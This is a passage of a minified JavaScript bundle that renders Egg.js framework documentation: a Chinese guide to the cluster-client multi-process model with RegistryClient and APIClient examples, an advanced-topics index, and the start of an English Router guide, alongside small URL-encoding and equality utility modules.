\u8fdb\u884c\u8ba2\u9605\n    app.registryClient.subscribe(\n      {\n        dataId: 'demo.DemoService',\n      },\n      (val) => {\n        // ...\n      },\n    );\n\n    // \u8c03\u7528 publish \u53d1\u5e03\u6570\u636e\n    app.registryClient.publish({\n      dataId: 'demo.DemoService',\n      publishData: 'xxx',\n    });\n\n    // \u8c03\u7528 getConfig \u63a5\u53e3\n    const res = await app.registryClient.getConfig('demo.DemoService');\n    console.log(res);\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u662f\u4e0d\u662f\u5f88\u7b80\u5355\uff1f"),r.a.createElement("p",null,"\u5f53\u7136\uff0c\u5982\u679c\u4f60\u7684\u5ba2\u6237\u7aef\u4e0d\u662f\u90a3\u4e48\u300e\u6807\u51c6\u300f\uff0c\u90a3\u4f60\u53ef\u80fd\u9700\u8981\u7528\u5230\u5176\u4ed6\u4e00\u4e9b API\uff0c\u6bd4\u5982\uff0c\u4f60\u7684\u8ba2\u9605\u51fd\u6570\u4e0d\u53eb ",r.a.createElement("code",null,"subscribe")," \u800c\u662f\u53eb ",r.a.createElement("code",null,"sub"),"\uff1a"),r.a.createElement(o["a"],{code:"class MockClient extends Base {\n  constructor(options) {\n    super({\n      initMethod: 'init',\n    });\n    this._options = options;\n    this._registered = new Map();\n  }\n\n  async init() {\n    this.ready(true);\n  }\n\n  sub(info, listener) {\n    const key = reg.dataId;\n    this.on(key, listener);\n\n    const data = this._registered.get(key);\n    if (data) {\n      process.nextTick(() => listener(data));\n    }\n  }\n\n  ...\n}",lang:"js"}),r.a.createElement("p",null,"\u4f60\u9700\u8981\u901a\u8fc7 ",r.a.createElement("code",null,"delegate"),"\uff08API \u4ee3\u7406\uff09\u624b\u52a8\u8bbe\u7f6e\u6b64\u59d4\u6258\uff1a"),r.a.createElement(o["a"],{code:"// agent.js\nmodule.exports = (agent) => {\n  agent.mockClient = agent\n    .cluster(MockClient)\n    // \u5c06 sub \u4ee3\u7406\u5230 subscribe \u903b\u8f91\u4e0a\n    .delegate('sub', 'subscribe')\n    .create();\n\n  agent.beforeStart(async () => {\n    await agent.mockClient.ready();\n  });\n};",lang:"js"}),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.mockClient = app\n    .cluster(MockClient)\n    // \u5c06 sub \u4ee3\u7406\u5230 subscribe \u903b\u8f91\u4e0a\n    .delegate('sub', 'subscribe')\n    .create();\n\n  app.beforeStart(async () => {\n    await app.mockClient.ready();\n\n    app.sub({ id: 'test-id' }, (val) => {\n      // put your code here\n    });\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u6211\u4eec\u5df2\u7ecf\u7406\u89e3\uff0c\u901a\u8fc7 ",r.a.createElement("code",null,"cluster-client")," \u53ef\u4ee5\u8ba9\u6211\u4eec\u5728\u4e0d\u7406\u89e3\u591a\u8fdb\u7a0b\u6a21\u578b\u7684\u60c5\u51b5\u4e0b\u5f00\u53d1\u300e\u7eaf\u7cb9\u300f\u7684 ",r.a.createElement("code",null,"RegistryClient"),"\uff0c\u53ea\u8d1f\u8d23\u548c\u670d\u52a1\u7aef\u8fdb\u884c\u4ea4\u4e92\uff0c\u7136\u540e\u4f7f\u7528 ",r.a.createElement("code",null,"cluster-client")," \u8fdb\u884c\u7b80\u5355\u7684\u5c01\u88c5\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u652f\u6301\u591a\u8fdb\u7a0b\u6a21\u578b\u7684 ",r.a.createElement("code",null,"ClusterClient"),"\u3002\u8fd9\u91cc\u7684 ",r.a.createElement("code",null,"RegistryClient")," \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u4e13\u95e8\u8d1f\u8d23\u548c\u8fdc\u7a0b\u670d\u52a1\u901a\u4fe1\u8fdb\u884c\u6570\u636e\u901a\u4fe1\u7684 ",r.a.createElement("code",null,"DataClient"),"\u3002"),r.a.createElement("p",null,"\u5927\u5bb6\u53ef\u80fd\u5df2\u7ecf\u53d1\u73b0\uff0c",r.a.createElement("code",null,"ClusterClient")," \u540c\u65f6\u5e26\u6765\u4e86\u4e00\u4e9b\u7ea6\u675f\uff0c\u5982\u679c\u60f3\u5728\u5404\u8fdb\u7a0b\u66b4\u9732\u540c\u6837\u7684\u65b9\u6cd5\uff0c\u90a3\u4e48 ",r.a.createElement("code",null,"RegistryClient")," \u4e0a\u53ea\u80fd\u652f\u6301 sub/pub \u6a21\u5f0f\u4ee5\u53ca\u5f02\u6b65\u7684 API \u8c03\u7528\u3002\u56e0\u4e3a\u5728\u591a\u8fdb\u7a0b\u6a21\u578b\u4e2d\u6240\u6709\u7684\u4ea4\u4e92\u90fd\u5fc5\u987b\u7ecf\u8fc7 socket \u901a\u4fe1\uff0c\u52bf\u5fc5\u5e26\u6765\u4e86\u8fd9\u4e00\u7ea6\u675f\u3002"),r.a.createElement("p",null,"\u5047\u8bbe\u6211\u4eec\u8981\u5b9e\u73b0\u4e00\u4e2a\u540c\u6b65\u7684 get \u65b9\u6cd5\uff0c\u8ba2\u9605\u8fc7\u7684\u6570\u636e\u76f4\u63a5\u653e\u5165\u5185\u5b58\uff0c\u4f7f\u7528 get \u65b9\u6cd5\u65f6\u76f4\u63a5\u8fd4\u56de\u3002\u8981\u600e\u4e48\u5b9e\u73b0\u5462\uff1f\u800c\u771f\u5b9e\u60c5\u51b5\u53ef\u80fd\u6bd4\u8fd9\u66f4\u590d\u6742\u3002"),r.a.createElement("p",null,"\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5f15\u5165\u4e00\u4e2a ",r.a.createElement("code",null,"APIClient")," \u7684\u6700\u4f73\u5b9e\u8df5\u3002\u5bf9\u4e8e\u6709\u8bfb\u53d6\u7f13\u5b58\u6570\u636e\u7b49\u540c\u6b65 API \u9700\u6c42\u7684\u6a21\u5757\uff0c\u5728 ",r.a.createElement("code",null,"RegistryClient")," \u57fa\u7840\u4e0a\u518d\u5c01\u88c5\u4e00\u4e2a ",r.a.createElement("code",null,"APIClient")," \u6765\u5b9e\u73b0\u8fd9\u4e9b\u4e0e\u8fdc\u7a0b\u670d\u52a1\u7aef\u4ea4\u4e92\u65e0\u5173\u7684 API\uff0c\u66b4\u9732\u7ed9\u7528\u6237\u4f7f\u7528\u5230\u7684\u662f\u8fd9\u4e2a ",r.a.createElement("code",null,"APIClient")," \u7684\u5b9e\u4f8b\u3002"),r.a.createElement("p",null,"\u5728 APIClient \u5185\u90e8\u5b9e\u73b0\u4e0a\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5f02\u6b65\u6570\u636e\u83b7\u53d6\uff0c\u901a\u8fc7\u8c03\u7528\u57fa\u4e8e ",r.a.createElement("code",null,"ClusterClient")," \u7684 ",r.a.createElement("code",null,"RegistryClient")," \u7684 API \u5b9e\u73b0\u3002"),r.a.createElement("li",null,"\u540c\u6b65\u8c03\u7528\u7b49\u4e0e\u670d\u52a1\u7aef\u65e0\u5173\u7684\u63a5\u53e3\u5728 ",r.a.createElement("code",null,"APIClient")," \u4e0a\u5b9e\u73b0\u3002\u7531\u4e8e ",r.a.createElement("code",null,"ClusterClient")," \u7684 API \u5df2\u7ecf\u62b9\u5e73\u4e86\u591a\u8fdb\u7a0b\u5dee\u5f02\uff0c\u6240\u4ee5\u5728\u5f00\u53d1 ",r.a.createElement("code",null,"APIClient")," \u8c03\u7528\u5230 ",r.a.createElement("code",null,"RegistryClient")," \u65f6\u4e5f\u65e0\u9700\u5173\u5fc3\u591a\u8fdb\u7a0b\u6a21\u578b\u3002")),r.a.createElement("p",null,"\u4f8b\u5982\u5728\u6a21\u5757\u7684 ",r.a.createElement("code",null,"APIClient")," \u4e2d\u589e\u52a0\u5e26\u7f13\u5b58\u7684 get \u540c\u6b65\u65b9\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"// some-client/index.js\nconst cluster = require('cluster-client');\nconst RegistryClient = require('./registry_client');\n\nclass APIClient extends Base {\n  constructor(options) {\n    super(options);\n\n    // options.cluster \u7528\u4e8e\u7ed9 Egg \u7684\u63d2\u4ef6\u4f20\u9012 app.cluster \u8fdb\u6765\n    this._client = (options.cluster || cluster)(RegistryClient).create(options);\n    this._client.ready(() => this.ready(true));\n\n    this._cache = {};\n\n    // subMap:\n    // {\n    //   foo: reg1,\n    //   bar: reg2,\n    // }\n    const subMap = options.subMap;\n\n    for (const key in subMap) {\n      this.subscribe(subMap[key], (value) => {\n        this._cache[key] = value;\n      });\n    }\n  }\n\n  subscribe(reg, listener) {\n    this._client.subscribe(reg, listener);\n  }\n\n  publish(reg) {\n    this._client.publish(reg);\n  }\n\n  get(key) {\n    return this._cache[key];\n  }\n}\n\n// \u6700\u7ec8\u6a21\u5757\u5411\u5916\u66b4\u9732\u8fd9\u4e2a APIClient\nmodule.exports = APIClient;",lang:"js"}),r.a.createElement("p",null,"\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8fd9\u4e48\u4f7f\u7528\u8be5\u6a21\u5757\uff1a"),r.a.createElement(o["a"],{code:"// app.js || agent.js\nconst APIClient = require('some-client'); // \u4e0a\u9762\u90a3\u4e2a\u6a21\u5757\nmodule.exports = app => {\n  const config = app.config.apiClient;\n  app.apiClient = new APIClient(Object.assign({}, config, { cluster: app.cluster });\n  app.beforeStart(async () => {\n    await app.apiClient.ready();\n  });\n};\n\n// config.${env}.js\nexports.apiClient = {\n  subMap: {\n    foo: {\n      id: '',\n    },\n    // bar...\n  }\n};",lang:"js"}),r.a.createElement("p",null,"\u4e3a\u4e86\u65b9\u4fbf\u4f60\u5c01\u88c5 ",r.a.createElement("code",null,"APIClient"),"\uff0c\u5728 ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/cluster-client"},"cluster-client")," \u6a21\u5757\u4e2d\u63d0\u4f9b\u4e86\u4e00\u4e2a ",r.a.createElement("code",null,"APIClientBase")," \u57fa\u7c7b\uff0c\u90a3\u4e48\u4e0a\u9762\u7684 ",r.a.createElement("code",null,"APIClient")," \u53ef\u4ee5\u6539\u5199\u4e3a\uff1a"),r.a.createElement(o["a"],{code:"const APIClientBase = require('cluster-client').APIClientBase;\nconst RegistryClient = require('./registry_client');\n\nclass APIClient extends APIClientBase {\n  // \u8fd4\u56de\u539f\u59cb\u7684\u5ba2\u6237\u7aef\u7c7b\n  get DataClient() {\n    return RegistryClient;\n  }\n\n  // \u7528\u4e8e\u8bbe\u7f6e cluster-client \u76f8\u5173\u53c2\u6570\uff0c\u7b49\u540c\u4e8e cluster \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\n  get clusterOptions() {\n    return {\n      responseTimeout: 120 * 1000,\n    };\n  }\n\n  subscribe(reg, listener) {\n    this._client.subscribe(reg, listener);\n  }\n\n  publish(reg) {\n    this._client.publish(reg);\n  }\n\n  get(key) {\n    return this._cache[key];\n  }\n}",lang:"js"}),r.a.createElement("p",null,"\u603b\u7ed3\u4e00\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"+------------------------------------------------+\n| APIClient                                      |\n|       +----------------------------------------|\n|       | ClusterClient                          |\n|       |      +---------------------------------|\n|       |      | RegistryClient                  |\n+------------------------------------------------+",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"RegistryClient - \u8d1f\u8d23\u548c\u8fdc\u7aef\u670d\u52a1\u901a\u8baf\uff0c\u5b9e\u73b0\u6570\u636e\u7684\u5b58\u53d6\uff0c\u53ea\u652f\u6301\u5f02\u6b65 API\uff0c\u4e0d\u5173\u5fc3\u591a\u8fdb\u7a0b\u6a21\u578b\u3002"),r.a.createElement("li",null,"ClusterClient - \u901a\u8fc7 ",r.a.createElement("code",null,"cluster-client")," \u6a21\u5757\u8fdb\u884c\u7b80\u5355 wrap \u5f97\u5230\u7684 client \u5b9e\u4f8b\uff0c\u8d1f\u8d23\u81ea\u52a8\u62b9\u5e73\u591a\u8fdb\u7a0b\u6a21\u578b\u7684\u5dee\u5f02\u3002"),r.a.createElement("li",null,"APIClient - \u5185\u90e8\u8c03\u7528 ",r.a.createElement("code",null,"ClusterClient")," \u505a\u6570\u636e\u540c\u6b65\uff0c\u65e0\u9700\u5173\u5fc3\u591a\u8fdb\u7a0b\u6a21\u578b\uff0c\u7528\u6237\u6700\u7ec8\u4f7f\u7528\u7684\u6a21\u5757\u3002API \u90fd\u901a\u8fc7\u6b64\u5904\u66b4\u9732\uff0c\u652f\u6301\u540c\u6b65\u548c\u5f02\u6b65\u3002")),r.a.createElement("p",null,"\u6709\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u770b\u4e00\u4e0b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues/322"},"\u589e\u5f3a\u591a\u8fdb\u7a0b\u7814\u53d1\u6a21\u5f0f")," \u8ba8\u8bba\u8fc7\u7a0b\u3002"),r.a.createElement("h2",{id:"\u5728\u6846\u67b6\u91cc\u9762-cluster-client-\u76f8\u5173\u7684\u914d\u7f6e\u9879"},r.a.createElement(l["AnchorLink"],{to:"#\u5728\u6846\u67b6\u91cc\u9762-cluster-client-\u76f8\u5173\u7684\u914d\u7f6e\u9879","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5728\u6846\u67b6\u91cc\u9762 cluster-client \u76f8\u5173\u7684\u914d\u7f6e\u9879"),r.a.createElement(o["a"],{code:"/**\n * @property {Number} responseTimeout - response timeout, default is 60000\n * @property {Transcode} [transcode]\n *   - {Function} encode - custom serialize method\n *   - {Function} decode - custom deserialize method\n */\nconfig.clusterClient = {\n  responseTimeout: 60000,\n};",lang:"js"}),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u914d\u7f6e\u9879"),r.a.createElement("th",null,"\u7c7b\u578b"),r.a.createElement("th",null,"\u9ed8\u8ba4\u503c"),r.a.createElement("th",null,"\u63cf\u8ff0"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"responseTimeout"),r.a.createElement("td",null,"number"),r.a.createElement("td",null,"60000 \uff08\u4e00\u5206\u949f\uff09"),r.a.createElement("td",null,"\u5168\u5c40\u7684\u8fdb\u7a0b\u95f4\u901a\u8baf\u7684\u8d85\u65f6\u65f6\u957f\uff0c\u4e0d\u80fd\u8bbe\u7f6e\u7684\u592a\u77ed\uff0c\u56e0\u4e3a\u4ee3\u7406\u7684\u63a5\u53e3\u672c\u8eab\u4e5f\u6709\u8d85\u65f6\u8bbe\u7f6e")),r.a.createElement("tr",null,r.a.createElement("td",null,"transcode"),r.a.createElement("td",null,"function"),r.a.createElement("td",null,"N/A"),r.a.createElement("td",null,"\u8fdb\u7a0b\u95f4\u901a\u8baf\u7684\u5e8f\u5217\u5316\u65b9\u5f0f\uff0c\u9ed8\u8ba4\u91c7\u7528 ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/serialize-json"},"serialize-json"),"\uff08\u5efa\u8bae\u4e0d\u8981\u81ea\u884c\u8bbe\u7f6e\uff09")))),r.a.createElement("p",null,"\u4e0a\u9762\u662f\u5168\u5c40\u7684\u914d\u7f6e\u65b9\u5f0f\u3002\u5982\u679c\uff0c\u4f60\u60f3\u5bf9\u4e00\u4e2a\u5ba2\u6237\u7aef\u5355\u72ec\u505a\u8bbe\u7f6e"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"app/agent.cluster(ClientClass, options)")," \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570 ",r.a.createElement("code",null,"options")," \u8fdb\u884c\u8986\u76d6")),r.a.createElement(o["a"],{code:"app.registryClient = app\n  .cluster(RegistryClient, {\n    responseTimeout: 120 * 1000, // \u8fd9\u91cc\u4f20\u5165\u7684\u662f\u548c cluster-client \u76f8\u5173\u7684\u53c2\u6570\n  })\n  .create({\n    // \u8fd9\u91cc\u4f20\u5165\u7684\u662f RegistryClient \u9700\u8981\u7684\u53c2\u6570\n  });",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8986\u76d6 ",r.a.createElement("code",null,"APIClientBase")," \u7684 ",r.a.createElement("code",null,"clusterOptions")," \u8fd9\u4e2a ",r.a.createElement("code",null,"getter")," \u5c5e\u6027")),r.a.createElement(o["a"],{code:"const APIClientBase = require('cluster-client').APIClientBase;\nconst RegistryClient = require('./registry_client');\n\nclass APIClient extends APIClientBase {\n  get DataClient() {\n    return RegistryClient;\n  }\n\n  get clusterOptions() {\n    return {\n      responseTimeout: 120 * 1000,\n    };\n  }\n\n  // ...\n}\n\nmodule.exports = APIClient;",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},"8Oo8":function(e,t,n){"use strict";var a=n("nzxN"),r=n("ZbH0");function l(e,t){var n=arguments.length>2&&void 0!==arguments[2]&&arguments[2],l=new Set;function o(e,t){var i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:1,c=l.has(e);if(Object(r["a"])(!c,"Warning: There may be circular references"),c)return!1;if(e===t)return!0;if(n&&i>1)return!1;l.add(e);var s=i+1;if(Array.isArray(e)){if(!Array.isArray(t)||e.length!==t.length)return!1;for(var u=0;u<e.length;u++)if(!o(e[u],t[u],s))return!1;return!0}if(e&&t&&"object"===Object(a["a"])(e)&&"object"===Object(a["a"])(t)){var d=Object.keys(e);return d.length===Object.keys(t).length&&d.every((function(n){return o(e[n],t[n],s)}))}return!1}return o(e,t)}t["a"]=l},"8bof":function(e,t,n){},"8frV":function(e,t,n){"use strict";var a=n("x0yn"),r=Object.prototype.hasOwnProperty,l=Array.isArray,o=function(){for(var e=[],t=0;t<256;++t)e.push("%"+((t<16?"0":"")+t.toString(16)).toUpperCase());return e}(),i=function(e){while(e.length>1){var t=e.pop(),n=t.obj[t.prop];if(l(n)){for(var a=[],r=0;r<n.length;++r)"undefined"!==typeof n[r]&&a.push(n[r]);t.obj[t.prop]=a}}},c=function(e,t){for(var n=t&&t.plainObjects?Object.create(null):{},a=0;a<e.length;++a)"undefined"!==typeof e[a]&&(n[a]=e[a]);return n},s=function e(t,n,a){if(!n)return t;if("object"!==typeof n){if(l(t))t.push(n);else{if(!t||"object"!==typeof t)return[t,n];(a&&(a.plainObjects||a.allowPrototypes)||!r.call(Object.prototype,n))&&(t[n]=!0)}return t}if(!t||"object"!==typeof t)return[t].concat(n);var o=t;return l(t)&&!l(n)&&(o=c(t,a)),l(t)&&l(n)?(n.forEach((function(n,l){if(r.call(t,l)){var o=t[l];o&&"object"===typeof o&&n&&"object"===typeof n?t[l]=e(o,n,a):t.push(n)}else t[l]=n})),t):Object.keys(n).reduce((function(t,l){var o=n[l];return r.call(t,l)?t[l]=e(t[l],o,a):t[l]=o,t}),o)},u=function(e,t){return Object.keys(t).reduce((function(e,n){return e[n]=t[n],e}),e)},d=function(e,t,n){var a=e.replace(/\+/g," ");if("iso-8859-1"===n)return a.replace(/%[0-9a-f]{2}/gi,unescape);try{return decodeURIComponent(a)}catch(r){return a}},m=function(e,t,n,r,l){if(0===e.length)return e;var i=e;if("symbol"===typeof e?i=Symbol.prototype.toString.call(e):"string"!==typeof e&&(i=String(e)),"iso-8859-1"===n)return escape(i).replace(/%u[0-9a-f]{4}/gi,(function(e){return"%26%23"+parseInt(e.slice(2),16)+"%3B"}));for(var c="",s=0;s<i.length;++s){var u=i.charCodeAt(s);45===u||46===u||95===u||126===u||u>=48&&u<=57||u>=65&&u<=90||u>=97&&u<=122||l===a.RFC1738&&(40===u||41===u)?c+=i.charAt(s):u<128?c+=o[u]:u<2048?c+=o[192|u>>6]+o[128|63&u]:u<55296||u>=57344?c+=o[224|u>>12]+o[128|u>>6&63]+o[128|63&u]:(s+=1,u=65536+((1023&u)<<10|1023&i.charCodeAt(s)),c+=o[240|u>>18]+o[128|u>>12&63]+o[128|u>>6&63]+o[128|63&u])}return c},p=function(e){for(var t=[{obj:{o:e},prop:"o"}],n=[],a=0;a<t.length;++a)for(var r=t[a],l=r.obj[r.prop],o=Object.keys(l),c=0;c<o.length;++c){var s=o[c],u=l[s];"object"===typeof u&&null!==u&&-1===n.indexOf(u)&&(t.push({obj:l,prop:s}),n.push(u))}return i(t),e},h=function(e){return"[object RegExp]"===Object.prototype.toString.call(e)},g=function(e){return!(!e||"object"!==typeof e)&&!!(e.constructor&&e.constructor.isBuffer&&e.constructor.isBuffer(e))},f=function(e,t){return[].concat(e,t)},E=function(e,t){if(l(e)){for(var n=[],a=0;a<e.length;a+=1)n.push(t(e[a]));return n}return t(e)};e.exports={arrayToObject:c,assign:u,combine:f,compact:p,decode:d,encode:m,isBuffer:g,isRegExp:h,maybeMap:E,merge:s}},"8if0":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/loader"},"Loader")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/plugin"},"Plugin Development")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/framework"},"Framework Development")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/cluster-client"},"Multi-Process Development Model Enhancement")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/view-plugin"},"View Plugin Development")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./advanced/loader-update"},"Upgrade your event functions in your lifecycle")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},"8jQ1":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Router is mainly used to describe the corresponding relationship between the request URL and the Controller that processes the request eventually. All routing rules are unified in the ",r.a.createElement("code",null,"app/router.js")," file by the framework."),r.a.createElement("p",null,"By unifying routing rules, we can avoid the routing logics scattered in many places which may cause many unknown conflicts, and we can more easily check global routing rules."),r.a.createElement("h2",{id:"how-to-define-router"},r.a.createElement(l["AnchorLink"],{to:"#how-to-define-router","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Define Router"),r.a.createElement("ul",null,r.a.createElement("li",null,"Define the routing rule in ",r.a.createElement("code",null,"app/router.js")," file")),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/user/:id', controller.user.info);\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Implement the Controller in ",r.a.createElement("code",null,"app/controller")," directory")),r.a.createElement(o["a"],{code:"// app/controller/user.js\nclass UserController extends Controller {\n  async info() {\n    const { ctx } = this;\n    ctx.body = {\n      name: `hello ${ctx.params.id}`,\n    };\n  }\n}",lang:"js"}),r.a.createElement("p",null,"This simplest Router is done by now, when users do the request ",r.a.createElement("code",null,"GET /user/123"),", the info function in ",r.a.createElement("code",null,"user.js")," will be invoked."),r.a.createElement("h2",{id:"router-config-in-detail"},r.a.createElement(l["AnchorLink"],{to:"#router-config-in-detail","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router Config in Detail"),r.a.createElement("p",null,"Below is the complete definition of router, parameters can be determined depending on different scenes."),r.a.createElement(o["a"],{code:"router.verb('path-match', app.controller.action);\nrouter.verb('router-name', 'path-match', app.controller.action);\nrouter.verb('path-match', middleware1, ..., middlewareN, app.controller.action);\nrouter.verb('router-name', 'path-match', middleware1, ..., middlewareN, app.controller.action);",lang:"js"}),r.a.createElement("p",null,"The complete definition of router includes 5 major parts:"),r.a.createElement("ul",null,r.a.createElement("li",null,"verb - actions that users trigger, including get, post and so on, and will be explained in detail later.",r.a.createElement("ul",null,r.a.createElement("li",null,"router.head - HEAD"),r.a.createElement("li",null,"router.options - OPTIONS"),r.a.createElement("li",null,"router.get - GET"),r.a.createElement("li",null,"router.put - PUT"),r.a.createElement("li",null,"router.post - POST"),r.a.createElement("li",null,"router.patch - PATCH"),r.a.createElement("li",null,"router.delete - DELETE"),r.a.createElement("li",null,"router.del - this is a alias method due to the reservation of delete."),r.a.createElement("li",null,"router.redirect - redirects the request URL. For example, the most common case is to redirect the request accessing the root directory to the homepage."))),r.a.createElement("li",null,"router-name defines a alias for the route, and URL can be generated by helper method ",r.a.createElement("code",null,"pathFor")," and ",r.a.createElement("code",null,"urlFor")," provided by Helper. (Optional)"),r.a.createElement("li",null,"path-match - URL path of the route."),r.a.createElement("li",null,"middleware1 - multiple Middlewares can be configured in Router. (Optional)"),r.a.createElement("li",null,"controller - set the route to map to the specific controller, and the controller can be written in two types:",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.controller.user.fetch")," - directly point to a controller"),r.a.createElement("li",null,r.a.createElement("code",null,"'user.fetch'")," - simplified as a string,")))),r.a.createElement("h3",{id:"notices"},r.a.createElement(l["AnchorLink"],{to:"#notices","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Notices"),r.a.createElement("ul",null,r.a.createElement("li",null,"multiple Middlewares can be configured to execute serially in Router definition"),r.a.createElement("li",null,"Controller must be defined under ",r.a.createElement("code",null,"app/controller")," directory"),r.a.createElement("li",null,"multiple Controllers can be defined within one file, and the specific one can be specified in the form of ",r.a.createElement("code",null,"$","{","fileName","}",".$","{","functionName","}")," when defining the routing rule."),r.a.createElement("li",null,"Controller supports sub-directories, and the specific one can be specified in the form of ",r.a.createElement("code",null,"$","{","directoryName","}",".$","{","fileName","}",".$","{","functionName","}")," when defining the routing rule.")),r.a.createElement("p",null,"Here are some examples of writing routing rules:"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/home', controller.home);\n  router.get('/user/:id', controller.user.page);\n  router.post('/admin', isAdmin, controller.admin);\n  router.post('/user', isLoginUser, hasAdminPermission, controller.user.create);\n  router.post('/api/v1/comments', controller.v1.comments.create); // app/controller/v1/comments.js\n};",lang:"js"}),r.a.createElement("h3",{id:"restful-style-url-definition"},r.a.createElement(l["AnchorLink"],{to:"#restful-style-url-definition","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"RESTful Style URL Definition"),r.a.createElement("p",null,"We provide ",r.a.createElement("code",null,"app.router.resources('routerName', 'pathMatch', 'controller')")," to generate ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/Create,_read,_update_and_delete"},"CRUD")," structures on a path for convenience if you prefer the RESTful style URL definition."),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.resources('posts', '/posts', controller.posts);\n  router.resources('users', '/api/v1/users', controller.v1.users); // app/controller/v1/users.js\n};",lang:"js"}),r.a.createElement("p",null,"The codes above produce a bunch of CRUD path structures for Controller ",r.a.createElement("code",null,"app/controller/posts.js"),", and the only thing you should do next is to implement related functions in ",r.a.createElement("code",null,"posts.js"),"."),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"Method"),r.a.createElement("th",null,"Path"),r.a.createElement("th",null,"Route Name"),r.a.createElement("th",null,"Controller.Action"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts"),r.a.createElement("td",null,"posts"),r.a.createElement("td",null,"app.controllers.posts.index")),r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts/new"),r.a.createElement("td",null,"new_post"),r.a.createElement("td",null,"app.controllers.posts.new")),r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts/:id"),r.a.createElement("td",null,"post"),r.a.createElement("td",null,"app.controllers.posts.show")),r.a.createElement("tr",null,r.a.createElement("td",null,"GET"),r.a.createElement("td",null,"/posts/:id/edit"),r.a.createElement("td",null,"edit_post"),r.a.createElement("td",null,"app.controllers.posts.edit")),r.a.createElement("tr",null,r.a.createElement("td",null,"POST"),r.a.createElement("td",null,"/posts"),r.a.createElement("td",null,"posts"),r.a.createElement("td",null,"app.controllers.posts.create")),r.a.createElement("tr",null,r.a.createElement("td",null,"PATCH"),r.a.createElement("td",null,"/posts/:id"),r.a.createElement("td",null,"post"),r.a.createElement("td",null,"app.controllers.posts.update")),r.a.createElement("tr",null,r.a.createElement("td",null,"DELETE"),r.a.createElement("td",null,"/posts/:id"),r.a.createElement("td",null,"post"),r.a.createElement("td",null,"app.controllers.posts.destroy")))),r.a.createElement(o["a"],{code:"// app/controller/posts.js\nexports.index = async () => {};\n\nexports.new = async () => {};\n\nexports.create = async () => {};\n\nexports.show = async () => {};\n\nexports.edit = async () => {};\n\nexports.update = async () => {};\n\nexports.destroy = async () => {};",lang:"js"}),r.a.createElement("p",null,"Methods that are not needed may not be implemented in ",r.a.createElement("code",null,"posts.js")," and the related URL paths will not be registered to Router 